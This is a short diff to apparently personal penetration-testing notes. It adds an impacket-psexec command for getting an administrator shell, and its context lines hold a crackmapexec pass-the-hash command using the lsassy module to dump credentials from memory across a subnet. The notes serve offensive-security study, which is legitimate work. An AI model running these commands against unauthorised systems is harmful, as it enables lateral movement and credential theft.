@@ -37,6 +37,11 @@
 		- `crackmapexec smb 10.0.1.4/24 -u pparker -H aad3b435b51404eeaad3b435b51404ee:e08e15bd995aa26400e3107deb56bb16 --local-auth -M lsassy`
 		- If there is any **==secret stored in memory of logged in users==**, we can see those.
 
+# Psexec
+---
+- Very similar to `crackmapexec` **but better**
+- Gain shell using:
+	- `impacket-psexec administrator:'password'@ip_address`
 # Stored Credentials using cmedb
 ---
 - `cmedb`
